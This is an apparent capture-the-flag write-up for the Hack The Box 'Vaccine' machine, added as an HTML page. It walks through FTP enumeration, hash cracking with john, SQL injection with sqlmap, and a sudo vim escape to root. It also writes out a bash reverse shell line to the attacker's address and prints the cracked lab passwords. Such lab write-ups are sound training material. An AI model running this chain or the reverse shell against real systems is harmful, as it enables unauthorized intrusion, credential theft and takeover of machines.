@@ -1,0 +1,67 @@
+---
+layout: default
+title: HTB | Vaccine
+---
+
+<a href="/htb/very-easy.html" class="top-left-back">&lt;&lt; Back</a>
+
+   <div class="wrapper">
+    <img src="/images/htb/very-easy/vaccine/vaccine.png" alt="vaccine logo">  
+     <h1>HTB - Vaccine</h1>
+    <p><strong>Operating System:</strong> Linux<br>
+      <strong>Tags:</strong> TBD</p>
+
+    <h2>Information Gathering</h2>
+    <p>First I started with a basic Nmap scan to identify open ports and services. This scan revealed FTP, SSH, and an Apache webserver were all actively running. I noticed that FTP had anonymous login enabled, so I checked that out first.</p>
+    <pre><code>$ nmap -sV -sC 10.129.183.17</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_nmap.png" alt="Vaccine nmap results">
+      
+    <h2>Vulnerability Assessment</h2>
+    <p>Using anonymous login, I discovered a <code>backup.zip</code> file which was encrypted.</p>
+    <pre><code>$ ftp 10.129.183.17<br>ftp> get backup.zip</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_ftp.png" alt="Vaccine ftp backup">
+    <br><br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_backup.png" alt="Vaccine backup encrypted">
+    <p>To crack the zip file I used <code>zip2john</code> to create the hash, and then used <code>john</code> with the <code>rockyou.txt</code> wordlist. This revealed the password "<code>741852963</code>" to access the zip.</p>
+    <pre><code>$ zip2john backup.zip > zip.hash<br>$ john --wordlist=../Wordlists/rockyou.txt zip.hash</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_zip2john.png" alt="Vaccine zip2john">
+    <br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_zip_password.png" alt="Vaccine zip password">
+
+    <h2>Exploitation</h2>
+    <p>Now with a working password, I opened the zip and viewed the <code>index.php</code> file. The contents contained a md5 hash for the administrator's password that I could use for the Apache webserver.</p>
+    <pre><code>$ cat index.php</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_admin_hash.png" alt="Vaccine admin hash">
+    <p>After putting the hash into a text file, I once again used John to crack this hash with <code>rockyou.txt</code> and found the admin password was <code>qwerty789</code>.</p>
+    <img src="/images/htb/very-easy/vaccine/vaccine_admin_password.png" alt="Vaccine admin password">
+    <pre><code>$ echo -n "2cb42f8734ea607eefed3b70af13bbd3" > admin.hash<br>$ john --format=raw-md5 --wordlist=../Wordlists/rockyou.txt admin.hash</code></pre>
+    <p>I then traveled to the Apache webpage and logged in as the admin to view a database. Immediately I thought of SQLi as a potential vulnerability, so I tested the search bar parameter with a single quote.</p>
+    <img src="/images/htb/very-easy/vaccine/vaccine_admin_dashboard" alt="Vaccine admin dashboard">
+    <br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_single_quote.png" alt="Vaccine sql single quote">
+    <p>A single quote produced an error, which proved likely that SQLi was possible. I loaded up <code>Burp Suite</code> to capture the search request, and forwarded that to <code>sqlmap</code>.
+    <img src="/images/htb/very-easy/vaccine/vaccine_web_request.png" alt="Vaccine web request">
+    <pre><code>$ sqlmap -r sql.req --batch --os-shell</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_sqlmap.png" alt="Vaccine sqlmap">  
+    <p>Sqlmap did find a vulnerability, which converted into a shell with the <code>--os-shell</code> flag. After confirming I had command injection, I set up <code>netcat</code> to create a reverse shell to my machine. With some quick searching, I found the user flag.</p>
+    <pre><code>os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.65/9001 0>&1'</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_sqlmap_reverse" alt="Vaccine sqlmap reverse shell">
+    <br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_netcat_shell.png" alt="Vaccine netcat shell">
+    <br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_user_flag.png" alt="Vaccine user flag">
+    
+    <h2>Post-Exploitation</h2>
+    <p>While using my netcat shell I was constantly being disconnected. This led me to finding some credentials located in the <code>dashboard.php</code> file I could use to SSH into the box.</p>
+    <pre><code>$ cat dashboard.php</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_db_password.png" alt="Vaccine database password">
+    <br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_ssh_login.png" alt="Vaccine ssh login">
+    <p>Now with a consistent connection, I began looking for ways to escalate my privileges. I started with <code>sudo -l</code> and found this user has sudo privelges on a file named <code>pg_hba.conf</code> using <code>vim</code>.</p>
+    <img src="/images/htb/very-easy/vaccine/vaccine_vim_file" alt="Vaccine vim file">
+    <p>Once in the file using vim, I used <code>:</code> to enter command mode and typed <code>!bash</code> to create a shell session. This gave me a root shell and allowed me to find the final flag.</p>
+    <pre><code>$ cat FILE NAME</code></pre>
+    <img src="/images/htb/very-easy/vaccine/vaccine_vim_command.png" alt="Vaccine vim command">
+    <br>
+    <img src="/images/htb/very-easy/vaccine/vaccine_root_flag.png" alt="Vaccine root flag">  
+  </div>
